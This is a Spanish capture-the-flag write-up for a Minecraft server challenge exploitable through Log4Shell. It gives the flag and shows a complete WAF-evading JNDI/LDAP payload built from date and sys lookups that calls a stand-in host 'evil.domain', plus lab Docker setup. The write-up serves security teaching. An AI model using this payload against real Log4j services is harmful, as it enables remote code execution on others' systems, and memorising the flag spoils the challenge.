## Redstone forge

Descripción: Mis amigos y yo hemos deidido crear un servidor de Minecraft público para conocer gente nueva! No creo, que pase nada malo, no..?

Flag: UAD360{34sY_Pe4Sy}

**Writeup**

En este reto se nos da una IP con el puerto 25565. Un simple escaneo con `nmap` indica de que se trata de un servidor de Minecraft

```
PORT      STATE SERVICE   VERSION

25565/tcp open  minecraft Minecraft 1.12.2 (Protocol: 127, Message: UAD Minecraft Server, Users: 1/100)
```

Al entrar en el servidor con cualquier cliente (oficial y no oficial) se puede observar que hay un usuario llamado UADBot y que el único comando que se puede usar es `/msgbot`. Se presupone por el nombre y por la respuesta al usar el comando que lo único que hace es enviarle un mensage privado a la cuenta BOT.

Probando un poco el comando de mensajería podemos llegar a la conclusión que se trata de Log4Shell, que una vulnerabilidad reciente que afecta a la biblioteca Log4j y que afectó a Minecraft entre otros servicios y aplicaciones. 

El comando por defecto para explotar Log4j no va a funcionar a causa de un WAF que bloquea algunos caracteres y palabras. Entre la lista del WAF están `jndi`, `ldap`, `/`, `-`, `upper` y `lower`.

Sin embargo, estas limitaciones no son suficientes para crear un payload que no use ningún elemento de la lista bloqueada.
En el caso de `ldap` y `jndi` se pueden separar en caracteres con el lookup  `${date:'<caracter>'}`. Juntando muchos lookups distintos se puede formar una palabra por lo que `jndi` se quedaría como:

```
${date:'j'}${date:'n'}${date:'d'}${date:'i'}
```
Se puede hacer lo mismo para `ldap`

Tampoco se puede usar `/`. Para eso se puede aprovechar un lookup de Log4j (`sys`), el cual accede a las propiedades de Java. `file.separator` es un simbolo separador de directorios. El valor por defecto en Windows es '\' y en Unix/Mac '/'.

El comando completo quedaría tal que así:

```
${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:${date:'l'}${date:'d'}${date:'a'}${date:'p'}:${sys:file.separator}${sys:file.separator}evil.domain${sys:file.separator}a}
```

Para conseguir una shell se podría usar tools como [Log4shell-POC](https://github.com/kozmer/log4j-shell-poc) o simplemente crear un servidor jndi y un servidor web con un archivo de java compilado con el código a ejecutar.

Una vez obtenida la shell la flag estará en flag.txt

---
**Instrucciones para el server**

```
sudo docker build -t mc_spigot .

sudo docker container run -d --name mc_spigot -p 25565:25565 -e EULA=true -t mc_spigot
```
**Instrucciones para el cliente**

Cambiar la IP del dockerfile `CLIENT_IP` a la IP privada del servidor o incluirla en el comando de run

Cambiar la url del jdk en el Dockerfile del cliente
```
sudo docker build -t mc_client .

sudo docker container run -d --name mc_client -e CLIENT_IP=<IP> -t mc_client
```

Creditos a [@nimmis](https://github.com/nimmis/docker-spigot) por la imagen de Docker


